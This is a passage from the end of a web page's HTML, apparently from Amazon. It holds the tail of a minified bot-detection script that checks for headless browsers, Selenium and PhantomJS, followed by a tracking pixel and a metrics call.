                                b && (a.Document.prototype.evaluate = function() {
                                    try {
                                        var d = Error("test error"),
                                            e = d.stack && d.stack.toString();
                                        e && e.match(/(puppeteer|phantomjs|apply.xpath)/) && c(52, 0, e);
                                        a.Document.prototype.evaluate = b;
                                        return b.apply(this,
                                            arguments)
                                    } catch (h) {
                                        return n(h, "JS exception while overidding evaluate"), a.Document.prototype.evaluate = b, b.apply(this, arguments)
                                    }
                                })
                            };
                        try {
                            v(navigator, "userAgent") && c(20);
                            var x = M(),
                                y, p;
                            (a.callPhantom || a._phantom || a.PhantomEmitter || a.__phantomas || /PhantomJS/.test(navigator.userAgent)) && c(5);
                            a.Buffer && c(12);
                            a.emit && c(13);
                            a.spawn && c(14);
                            (null != a.domAutomation || null != a.domAutomationController || null != a._WEBDRIVER_ELEM_CACHE || /HeadlessChrome/.test(navigator.userAgent) || "" === navigator.languages) && c(0);
                            if (u.isChrome() &&
                                a.webkitRequestFileSystem) a.webkitRequestFileSystem(a.TEMPORARY, 1, function() {}, function() {
                                c(0)
                            });
                            else if (u.isSafari() && a.localStorage) {
                                try {
                                    a.localStorage.setItem("__nadu", "")
                                } catch ($) {
                                    c(3)
                                }
                                a.localStorage.removeItem("__nadu")
                            }
                            G(a, 30);
                            u.isWebkit() && x && w() && (void 0 === a.chrome && c(0), a.chrome && a.chrome.app && !1 !== a.chrome.app.isInstalled && void 0 !== navigator.languages && c(31));
                            a.external && "function" === typeof a.external.toString && a.external.toString() && -1 < a.external.toString().indexOf("RuntimeObject") && c(8);
                            a.FirefoxInterfaces && "function" === typeof a.FirefoxInterfaces && a.FirefoxInterfaces("wdICoordinate", "wdIMouse", "wdIStatus") && c(2);
                            a.XPCOMUtils && c(9);
                            (a.Components && (a.Components.interfaces && a.Components.interfaces.nsICommandProcessor || a.Components.wdICoordinate || a.Components.wdIMouse || a.Components.wdIStatus || a.Components.classes) || a.netscape && a.netscape.security && a.netscape.security.privilegemanager) && c(8);
                            a.isExternalUrlSafeForNavigation && c(1);
                            !a.opera || null === a.opera._browserjsran || 0 !== a.opera._browserjsran &&
                                !1 !== a.opera._browserjsran || c(4);
                            a.screen && (1 >= a.screen.availHeight || 1 >= a.screen.availWidth || 1 >= a.screen.height || 1 >= a.screen.width || 0 >= a.screen.devicePixelRatio) && c(10);
                            var E = window.setInterval(function() {
                                try {
                                    var a = b();
                                    a.isSel && (c(a.headlessCode, !0 === a.isTest ? 1 : 0, a.info), window.clearInterval(E), I(y))
                                } catch (d) {
                                    window.clearInterval(E), n(d, "JS exception - detectSelenium")
                                }
                            }, 1E3);
                            window.setTimeout(function() {
                                    try {
                                        window.clearInterval(E), I(y)
                                    } catch (a) {
                                        n(a, "JS exception - clearInterval for detectSelenium")
                                    }
                                },
                                1E4);
                            var K = a.PointerEvent;
                            a.PointerEvent = function() {
                                c(11);
                                if (void 0 !== K) {
                                    var a = Array.prototype.slice.call(arguments);
                                    return new K(a)
                                }
                                return null
                            };
                            e();
                            N(a);
                            L();
                            S();
                            0 !== a.outerHeight && 0 !== a.outerWidth || c(29);
                            O();
                            !w() || navigator.plugins && 0 != navigator.plugins.length || (x ? c(38, 0, "chrm") : u.isFirefox() && c(38, 0, "ff"));
                            V(R, 10);
                            x && w() && a.chrome && !a.chrome.csi && !a.chrome.loadTimes && c(25);
                            z();
                            y = J(null, Math.random().toString(36).substr(2));
                            p = v(y, "contentWindow") ? a : y.contentWindow;
                            d(p);
                            G(p, 42);
                            0 === A(navigator, "connection",
                                "rtt") && c(44);
                            P();
                            Q()
                        } catch (Y) {
                            n(Y, "JS exception - ")
                        }
                    })(z)
                })(ue_csm, window, document);



            }
            /* ◬ */
        </script>

    </div>

    <noscript>
        <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:133-0374257-6245133:VNE39923462MAN8CDC9Z$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DVNE39923462MAN8CDC9Z:0' alt="" />
    </noscript>

    <script>
        window.ue && ue.count && ue.count('CSMLibrarySize', 67461)
    </script>

    <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
</body>

</html>